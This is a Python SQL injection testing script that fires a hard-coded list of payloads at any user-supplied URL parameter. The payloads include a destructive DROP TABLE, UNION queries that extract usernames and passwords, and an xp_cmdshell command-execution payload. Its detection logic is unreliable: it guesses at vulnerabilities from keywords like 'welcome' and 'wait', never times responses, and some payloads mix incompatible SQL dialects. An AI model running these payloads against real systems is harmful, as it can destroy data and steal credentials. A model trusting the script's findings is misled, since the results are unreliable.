import argparse
import requests

def detect_vulnerabilities(response_text):
    vulnerabilities = []
    if "error" in response_text.lower():
        vulnerabilities.append("Error-based SQL Injection")
    if "welcome" in response_text.lower():
        vulnerabilities.append("Boolean-based SQL Injection")
    if "wait" in response_text.lower():
        vulnerabilities.append("Time-based Blind SQL Injection")
    if "union" in response_text.lower():
        vulnerabilities.append("Union-based SQL Injection")
    if "nslookup" in response_text.lower():
        vulnerabilities.append("Out-of-Band SQL Injection")
    return vulnerabilities

def test_sqli_vulnerability(url, parameter, payloads):
    for payload, payload_name in payloads:
        test_url = f"{url}?{parameter}={payload}"
        response = requests.get(test_url)
        detected_vulnerabilities = detect_vulnerabilities(response.text)

        if detected_vulnerabilities:
            print(f"Payload: {payload_name}")
            print(f"Detected Vulnerabilities: {', '.join(detected_vulnerabilities)}")
            print("=" * 50)

def main():
    parser = argparse.ArgumentParser(description="SQL Injection Vulnerability Tester")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--parameter", required=True, help="Target parameter")

    args = parser.parse_args()

    payloads = [
        ("'", "Single Quote Test"),
        ("'; DROP TABLE users; --", "SQL Injection with Malicious Query"),
        ("' OR '1'='1", "Boolean-based SQL Injection Test"),
        ("' OR '1'='2", "Boolean-based SQL Injection Test (False Condition)"),
        ("' OR IF(1=1, SLEEP(5), 0)--", "Time-based Blind SQL Injection Test"),
        ("' OR IF(1=2, SLEEP(5), 0)--", "Time-based Blind SQL Injection Test (False Condition)"),
        ("' OR 1=CONVERT(int, (SELECT @@version))--", "Error-based SQL Injection Test"),
        ("' UNION SELECT null, username, password FROM users--", "Union-based SQL Injection Test"),
        ("' OR 1=1; EXEC xp_cmdshell('nslookup example.com')--", "Out-of-Band SQL Injection Test"),
        ("'; SELECT TOP 1 username FROM users--", "String-based SQL Injection Test"),
        ("1; SELECT username FROM users WHERE '1'='1'--", "Numeric-based SQL Injection Test"),
        ("' OR IF(1=1, WAITFOR DELAY '0:0:5', 0)--", "Boolean-based Time Delay Test"),
        ("' UNION SELECT null, username + ':' + password FROM users--", "Error-based Concatenation Test"),
    ]

    test_sqli_vulnerability(args.url, args.parameter, payloads)

if __name__ == "__main__":
    main()
